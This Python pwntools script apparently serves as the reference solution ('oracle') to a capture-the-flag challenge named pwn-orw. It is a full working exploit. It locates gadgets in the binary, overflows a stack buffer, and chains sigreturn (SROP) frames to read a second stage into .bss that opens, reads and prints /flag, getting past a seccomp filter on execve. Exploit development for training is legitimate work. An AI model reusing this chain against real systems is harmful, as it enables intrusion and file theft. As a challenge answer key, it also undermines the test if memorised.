#!/usr/bin/env python3
"""Oracle for pwn-orw: seccomp blocks execve; usable gadgets are only
pop rax; ret and syscall; ret. Chain:

stage 1 (fits in the 400-byte read): leak stack, overflow, one sigreturn
frame that performs read(0, BSS, 0x400) and sets rsp = BSS.
stage 2 (lands in .bss): SROP open("/flag"), read(3, ...), write(1, ...)."""

from pwn import ELF, SigreturnFrame, context, p64, remote

context.log_level = "error"
context.arch = "amd64"
e = ELF("/work/quote/quote", checksec=False)

import struct

data = open("/work/quote/quote", "rb").read()
phoff = struct.unpack("<Q", data[0x20:0x28])[0]
phentsize, phnum = struct.unpack("<HH", data[0x36:0x3A])
segs = []
for i in range(phnum):
    p = phoff + i * phentsize
    ptype, flags = struct.unpack("<II", data[p : p + 8])
    offset, vaddr = struct.unpack("<QQ", data[p + 8 : p + 24])
    if ptype == 1 and flags & 1:
        segs.append((offset, vaddr))


def find_gadget(pat: bytes) -> int:
    i = data.find(pat)
    while i != -1:
        for o, v in segs:
            if o <= i < o + 0x200000:
                return v + (i - o)
        i = data.find(pat, i + 1)
    raise RuntimeError("gadget not found")


pop_rax = find_gadget(b"\x58\xc3")
syscall_ret = find_gadget(b"\x0f\x05\xc3")

BSS = e.bss(0x1000)
BSS2 = BSS + 0x500  # flag buffer
HEAD = p64(pop_rax) + p64(15) + p64(syscall_ret)
FLEN = len(bytes(SigreturnFrame()))
PATH = BSS + 3 * (24 + FLEN)  # right after three heads+frames
PAD = 88

r = remote("quote", 9999, timeout=10)
r.recvuntil(b"debug: input buffer at ")
buf = int(r.recvuntil(b"\n", drop=True), 16)

# stage 1: one SROP -> read(0, BSS, 0x400), continue at BSS
f1 = SigreturnFrame()
f1.rax = 0
f1.rdi = 0
f1.rsi = BSS
f1.rdx = 0x400
f1.rip = syscall_ret
f1.rsp = BSS
stage1 = b"A" * PAD + HEAD + bytes(f1)
assert len(stage1) <= 400, len(stage1)
r.send(stage1 + b"\n")

# stage 2: open / read / write via three SROP frames in .bss
f2 = SigreturnFrame()
f2.rax, f2.rdi, f2.rsi, f2.rdx = 2, PATH, 0, 0
f2.rip = syscall_ret
f2.rsp = BSS + 24 + FLEN
f3 = SigreturnFrame()
f3.rax, f3.rdi, f3.rsi, f3.rdx = 0, 3, BSS2, 0x100
f3.rip = syscall_ret
f3.rsp = BSS + 2 * (24 + FLEN)
f4 = SigreturnFrame()
f4.rax, f4.rdi, f4.rsi, f4.rdx = 1, 1, BSS2, 0x100
f4.rip = syscall_ret
f4.rsp = BSS + 0x4F0
stage2 = HEAD + bytes(f2) + HEAD + bytes(f3) + HEAD + bytes(f4) + b"/flag\x00"
assert len(stage2) <= 0x400, len(stage2)
assert PATH == BSS + len(stage2) - 6
r.send(stage2)
out = r.recvall(timeout=8)
print(out.decode(errors="replace"))
